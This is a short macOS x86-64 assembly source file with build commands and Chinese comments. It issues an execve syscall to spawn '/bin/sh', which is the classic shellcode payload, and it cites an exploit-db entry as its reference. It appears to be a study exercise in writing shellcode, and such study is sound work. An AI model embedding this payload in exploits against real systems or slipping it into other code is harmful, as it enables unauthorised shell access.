; nasm -f macho64 execve.asm
; ld -macosx_version_min 10.14 -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem -o execve execve.o 

; 参考文章：https://www.exploit-db.com/exploits/46397

BITS    64
global  _main

section     .text
_main:
    ; execve("//bin/sh", 0, 0)
    xor     rax, rax        ; rax = 0
    mov     al, 0x2         ; rax = 0x2
    ror     rax, 0x28       ; 左移 rax = 0x2000000
    mov     al, 0x3b        ; rax=execve

    xor     rdx, rdx        ; rdx=0
    xor     rsi, rsi        ; rsi = 0

    mov     rdi, '//bin/sh'
    push    rdx
    push    rdi
    push    rsp
    pop     rdi             ; rdi = '//bin/sh'

    syscall                 ; rax=execve rdi='//bin/sh' rsi=0 rdx=0